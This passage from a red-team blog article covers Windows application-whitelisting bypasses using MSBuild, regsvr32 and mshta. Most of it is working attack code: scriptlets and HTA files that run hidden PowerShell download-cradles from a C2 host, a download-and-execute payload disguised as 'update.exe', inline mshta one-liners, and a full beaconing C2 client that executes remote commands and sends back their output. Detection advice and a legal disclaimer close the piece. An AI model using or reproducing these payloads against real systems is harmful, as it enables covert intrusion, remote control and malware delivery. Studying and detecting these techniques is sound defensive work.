  </UsingTask>
</Project>
```

This creates a reverse TCP shell that connects back to your attacker machine. When you run it with MSBuild, you get an interactive shell, all through a trusted Microsoft binary.

What's important to understand is that MSBuild is compiling this code at runtime. The C# code never exists as a compiled .exe or .dll on disk - it's compiled in memory and executed immediately. This makes it very difficult for traditional antivirus to detect because there's no file to scan.

### Regsvr32: Remote Scriptlet Execution

Regsvr32.exe is the Windows utility for registering and unregistering COM DLLs. It's another signed Microsoft binary that's whitelisted by default. What makes it interesting for bypassing application whitelisting is a lesser-known feature: it can fetch and execute scriptlets from remote URLs.

A scriptlet is a COM object defined in XML with embedded script code (JScript or VBScript). Regsvr32 can download these scriptlets from HTTP/HTTPS URLs and execute the embedded script. This gives us remote code execution through a completely legitimate Windows binary.

Here's how it works. First, you create a .sct (scriptlet) file on your web server:

```xml
<?XML version="1.0"?>
<scriptlet>
  <registration
    description="Bypass"
    progid="Bypass"
    version="1.00"
    classid="{F0001111-0000-0000-0000-0000FEEDACDC}"
    remotable="true">
  </registration>

  <script language="JScript">
    <![CDATA[
      // This code runs when the scriptlet is loaded
      var shell = new ActiveXObject("WScript.Shell");

      // Execute calc.exe as a test
      shell.Run("calc.exe");

      // Or execute PowerShell for real payload delivery
      var command = 'powershell.exe -NoProfile -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://your-c2.com/payload.ps1\')"';
      shell.Run(command, 0, false);

      // Can also create scheduled tasks, modify registry, etc.
    ]]>
  </script>
</scriptlet>
```

Save this as `bypass.sct` on your web server. Then on the target system, execute:

```powershell
# Download and execute the remote scriptlet
regsvr32.exe /s /n /u /i:http://your-server.com/bypass.sct scrobj.dll
```

Let me explain these flags. The `/s` parameter runs in silent mode without showing message boxes. The `/n` flag tells regsvr32 not to call DllRegisterServer since we're not actually registering a DLL. The `/u` flag puts it in unregister mode, which combined with `/n` just loads the scriptlet without trying to register anything. The `/i:http://...` parameter specifies the URL to the scriptlet. Finally, `scrobj.dll` is the Windows Script Component runtime DLL that handles the actual scriptlet execution.

When you run this command, regsvr32 downloads the scriptlet from your server and executes the embedded JScript code. From a network perspective, this looks like a normal HTTP/HTTPS request. From a process perspective, it's regsvr32.exe - a trusted Microsoft binary - doing what it's designed to do.

The scriptlet can do anything that JScript or VBScript can do with ActiveX objects, which is actually quite a lot. You can execute commands via WScript.Shell, create and manipulate files with FileSystemObject, make HTTP requests with XMLHTTP or WinHttp objects, modify the registry, create scheduled tasks, and download additional payloads. Essentially, you have full system access through scripting languages that are built into Windows.

Here's a more sophisticated example that implements a download-and-execute pattern:

```xml
<?XML version="1.0"?>
<scriptlet>
  <registration
    description="Downloader"
    progid="Downloader"
    version="1.00"
    classid="{F0001111-0000-0000-0000-0000FEEDACDC}">
  </registration>

  <script language="JScript">
    <![CDATA[
      function DownloadAndExecute(url, filename) {
        try {
          // Create XMLHTTP object for downloading
          var xhr = new ActiveXObject("MSXML2.XMLHTTP");
          xhr.open("GET", url, false);
          xhr.send();

          // Save to temp directory
          var stream = new ActiveXObject("ADODB.Stream");
          stream.Type = 1; // Binary
          stream.Open();
          stream.Write(xhr.ResponseBody);

          var tempDir = new ActiveXObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%");
          var filepath = tempDir + "\\" + filename;
          stream.SaveToFile(filepath, 2); // Overwrite
          stream.Close();

          // Execute the downloaded file
          var shell = new ActiveXObject("WScript.Shell");
          shell.Run(filepath, 0, false);

        } catch(e) {
          // Silently fail
        }
      }

      // Execute on load
      DownloadAndExecute("http://your-c2.com/payload.exe", "update.exe");
    ]]>
  </script>
</scriptlet>
```

This scriptlet downloads a binary from your C2 server and executes it. The downloaded file does touch disk, but only after you've already bypassed application whitelisting to execute the scriptlet.

One important note: regsvr32 is 32-bit by default on 64-bit systems. If you need 64-bit execution, use:

```powershell
C:\Windows\System32\regsvr32.exe /s /n /u /i:http://your-server.com/bypass.sct scrobj.dll
```

### Mshta: HTML Application Execution

Mshta.exe is the Windows utility for executing HTML Application (.hta) files. HTA files are essentially HTML pages with full access to Windows APIs through ActiveX objects. Mshta is signed by Microsoft and whitelisted by default because it's a legitimate Windows component.

What makes mshta perfect for bypassing application whitelisting is that it can execute HTA files from remote URLs, and HTA files can contain VBScript or JScript with full system access. It's essentially a browser that runs with no sandbox restrictions.

Here's a basic HTA file:

```html
<!DOCTYPE html>
<html>
<head>
  <title>Windows Update</title>
  <HTA:APPLICATION
    ID="WindowsUpdate"
    APPLICATIONNAME="Windows Update"
    BORDER="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    WINDOWSTATE="minimize"
  />

  <script language="VBScript">
    Sub Window_OnLoad
      ' This code runs when the HTA loads
      Dim objShell
      Set objShell = CreateObject("WScript.Shell")

      ' Execute calc.exe as a test
      objShell.Run "calc.exe", 0, False

      ' Execute PowerShell for real payload
      Dim command
      command = "powershell.exe -NoProfile -WindowStyle Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://your-c2.com/payload.ps1')"""
      objShell.Run command, 0, False

      ' Close the HTA window
      window.close()
    End Sub
  </script>
</head>
<body>
  <div>Loading...</div>
</body>
</html>
```

Save this as `update.hta` on your web server. Execute it on the target with:

```powershell
# Execute remote HTA file
mshta.exe http://your-server.com/update.hta

# Or use vbscript: protocol for inline execution
mshta.exe vbscript:Close(Execute("CreateObject(""WScript.Shell"").Run ""calc.exe"", 0"))

# JavaScript variant
mshta.exe javascript:a=(GetObject("script:http://your-server.com/payload.js")).Run();close();
```

The `vbscript:` and `javascript:` protocol handlers are particularly interesting because they let you execute code inline without even fetching a remote file:

```powershell
# Inline VBScript execution
mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell.exe -NoProfile -Command IEX (New-Object Net.WebClient).DownloadString('http://your-c2.com/payload.ps1')"", 0:close")
```

This entire command executes without creating any files on disk. The VBScript code is parsed and executed directly from the command line.

Here's a more complete HTA example that implements a basic C2 client:

```html
<!DOCTYPE html>
<html>
<head>
  <title>System Update</title>
  <HTA:APPLICATION
    ID="SystemUpdate"
    APPLICATIONNAME="System Update"
    BORDER="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    WINDOWSTATE="minimize"
    SCROLL="no"
  />

  <script language="VBScript">
    ' Simple C2 client that beacons to server and executes commands
    Dim objShell, objHTTP, serverURL
    Set objShell = CreateObject("WScript.Shell")
    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
    serverURL = "http://your-c2.com/command"

    Sub Window_OnLoad
      ' Start beacon loop
      BeaconLoop()
    End Sub

    Sub BeaconLoop()
      On Error Resume Next

      ' Send beacon to server
      objHTTP.Open "GET", serverURL & "?id=" & objShell.ExpandEnvironmentStrings("%COMPUTERNAME%"), False
      objHTTP.Send

      If objHTTP.Status = 200 Then
        Dim command
        command = objHTTP.ResponseText

        If Len(command) > 0 Then
          If command = "exit" Then
            window.close()
            Exit Sub
          End If

          ' Execute the command
          Dim result
          result = ExecuteCommand(command)

          ' Send result back to server
          objHTTP.Open "POST", serverURL & "/result", False
          objHTTP.Send result
        End If
      End If

      ' Wait 5 seconds before next beacon
      window.setTimeout "BeaconLoop()", 5000, "VBScript"
    End Sub

    Function ExecuteCommand(cmd)
      On Error Resume Next
      Dim objExec, output
      Set objExec = objShell.Exec(cmd)

      ' Read output
      output = objExec.StdOut.ReadAll()
      If Len(output) = 0 Then
        output = objExec.StdErr.ReadAll()
      End If

      ExecuteCommand = output
    End Function
  </script>
</head>
<body bgcolor="#000000">
  <div style="color:#fff;">Updating system components...</div>
</body>
</html>
```

This HTA implements a simple beacon-based C2 client. It polls your server for commands, executes them, and sends the results back. All of this happens through mshta.exe, a signed Microsoft binary.

### Why These Techniques Work

The reason these application whitelisting bypasses are so effective is that they exploit the dual-use nature of legitimate Windows utilities. MSBuild is designed to compile code, regsvr32 is designed to load and execute COM objects, and mshta is designed to run HTML applications with system access.

From an application whitelisting perspective, blocking these utilities is difficult because developers need MSBuild for building .NET applications, system administrators use regsvr32 for managing COM components, and some legacy applications use HTA files for legitimate purposes.

Organizations that try to block these binaries often find that they break legitimate business functionality. This creates a dilemma for defenders: allow these tools and accept the risk, or block them and deal with compatibility issues.

Modern application whitelisting solutions have started implementing additional controls such as blocking execution from user-writable directories, restricting network access for these binaries, monitoring for suspicious command-line arguments, and implementing parent-child process restrictions.

But even with these controls, creative attackers can often find ways to abuse these binaries. The fundamental issue is that these are legitimate, necessary Windows components with powerful capabilities.

### Detection and Mitigation

From a blue team perspective, detecting abuse of these binaries requires monitoring for unusual patterns. For MSBuild, watch for execution from unexpected locations like user directories or temp folders, unusual parent processes (it should typically be Visual Studio or build automation), network connections from MSBuild.exe, and command-line arguments pointing to XML files in suspicious locations.

For Regsvr32, monitor network connections especially to external IPs, command-line arguments with /i: pointing to URLs, execution with the scrobj.dll parameter, and unusual parent processes. For Mshta, look for network connections to external servers, command-line arguments with http://, vbscript:, or javascript:, execution from unusual parent processes, and child processes spawned by mshta.exe.

Security teams should monitor Windows Event ID 4688 (process creation) with command-line auditing enabled to catch these techniques. Sysmon is even better because it provides detailed process creation, network connection, and parent-process information.

## Conclusion

Living off the land has fundamentally changed how I approach red team engagements. Instead of dropping tools and hoping they don't get detected, I work entirely within the normal operating environment of Windows systems. I use the same tools that system administrators use every day - PowerShell for automation and management, WMI for remote system queries, certutil for certificate operations, scheduled tasks for maintenance operations, and dozens of other legitimate Windows utilities.

What makes this approach so powerful isn't just that it avoids signature-based detection. It's that it forces defenders to shift from simply blocking known-bad tools to analyzing behavior and distinguishing malicious intent from legitimate administrative activity. This is an incredibly difficult problem for defenders to solve.

Throughout this article, we've covered the complete lifecycle of a post-exploitation operation using only native Windows tools. We started with reconnaissance - understanding the system we've compromised, enumerating domain structure, and identifying targets for lateral movement. We moved through credential harvesting techniques like LSASS memory dumping with rundll32 and comsvcs.dll, registry hive extraction, and searching for credentials in files and PowerShell history.

We explored multiple lateral movement techniques - PowerShell Remoting for modern Windows management, WMI for broader compatibility, DCOM for stealthy execution, scheduled tasks for persistence and execution, and service-based techniques for SYSTEM-level access. Each technique has its place depending on the target environment, your objectives, and the level of monitoring you're facing.

For persistence, we looked at methods ranging from simple registry run keys and startup folder modifications to sophisticated WMI event subscriptions that trigger based on system events. The key with persistence is choosing methods that blend in with the normal system configuration and are unlikely to be discovered during routine administration.

Finally, we covered data exfiltration using HTTP/HTTPS with PowerShell, certutil for file transfers, BITS for resumable background transfers, SMB for direct file copying, DNS for stealthy data tunneling, and email for leveraging existing communication channels.

From a defender's perspective, detecting these techniques requires a fundamental shift in approach. You can't rely on signature-based detection when attackers are using signed Microsoft binaries doing what they're designed to do. Instead, you need comprehensive logging - PowerShell script block logging, command-line process auditing, WMI activity monitoring, and Sysmon for detailed system activity. You need behavioral analytics that can identify suspicious patterns like PowerShell downloading and executing scripts from the internet, WMI being used to create processes on remote systems at unusual times, scheduled tasks being created with suspicious command lines, or abnormal data transfer patterns that might indicate exfiltration.

The cat-and-mouse game between red and blue teams continues to evolve. As defenders get better at detecting specific living-off-the-land techniques, attackers find new ways to abuse legitimate functionality. The techniques in this article represent current best practices, but they're not static - both offensive and defensive capabilities continue to advance.

One thing I've learned from years of red teaming is that technical sophistication only gets you so far. The most successful operations combine technical skill with operational security discipline. It doesn't matter how stealthy your techniques are if you leave obvious traces, work during suspicious hours, or exfiltrate terabytes of data in a single burst. Success requires understanding not just how to execute techniques, but when to use them, what logs they create, and how to make your activity blend in with legitimate operations.

Remember that everything in this article should only be used in authorized security assessments, penetration tests, and red team engagements. Unauthorized access to computer systems is illegal and unethical. Always operate within proper legal and ethical boundaries, maintain clear authorization documentation, and follow responsible disclosure practices for any vulnerabilities you discover.

## References

- [LOLBAS Project](https://lolbas-project.github.io/) - Comprehensive database of Living Off the Land binaries and scripts
- [MITRE ATT&CK - Execution](https://attack.mitre.org/tactics/TA0002/) - Execution tactics and techniques
- [MITRE ATT&CK - Persistence](https://attack.mitre.org/tactics/TA0003/) - Persistence mechanisms
- [MITRE ATT&CK - Lateral Movement](https://attack.mitre.org/tactics/TA0008/) - Lateral movement techniques
- [PowerShell Documentation](https://docs.microsoft.com/en-us/powershell/) - Official Microsoft PowerShell documentation
- [Windows Sysinternals Sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon) - System monitoring and logging tool
- [PowerShell ♥ the Blue Team](https://devblogs.microsoft.com/powershell/powershell-the-blue-team/) - PowerShell security features and logging
- [Active Directory Security](https://adsecurity.org/) - Active Directory attack and defense techniques
- [Harmj0y's Blog](http://blog.harmj0y.net/) - Advanced PowerShell and AD techniques
- [Red Team Field Manual](https://www.amazon.com/Rtfm-Red-Team-Field-Manual/dp/1494295504) - Quick reference for offensive operations

---

*Disclaimer: This article is provided for educational purposes only. The techniques described should only be used in authorized environments and security research contexts. Always follow responsible disclosure practices and operate within legal and ethical boundaries.*
